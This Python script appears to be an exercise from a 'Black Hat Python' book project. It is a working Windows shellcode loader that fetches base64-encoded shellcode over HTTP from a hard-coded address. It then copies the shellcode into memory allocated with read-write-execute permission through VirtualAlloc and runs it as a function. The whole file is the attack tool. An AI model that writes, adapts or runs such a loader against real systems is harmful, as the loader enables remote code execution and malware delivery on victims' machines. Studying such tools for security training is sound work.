#!/usr/bin/env python
# encoding: utf-8
"""
@author: HuRuiFeng
@file: shell_exec.py
@time: 2022/5/26 15:35
@project: black-hat-python-2ed
@desc: P157 以Python风格执行shellcode
"""
import base64
import ctypes

from urllib import request

kernel32 = ctypes.windll.kernel32


def get_code(url):
    # 从服务器中拉取base64编码的shellcode
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode


def write_mempry(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    # 指定VirtualAlloc返回的数据类型是指针
    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t
    )

    # 0x40表明这段内存同时具有读/写和执行权限
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr


def run(shellcode):
    # 分配缓冲区存储解码后的shellcode
    buffer = ctypes.create_string_buffer(shellcode)
    ptr = write_mempry(buffer)

    # 转换为函数指针
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    # 调用函数
    shell_func()


if __name__ == '__main__':
    url = "http://192.168.56.101:8100/shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)
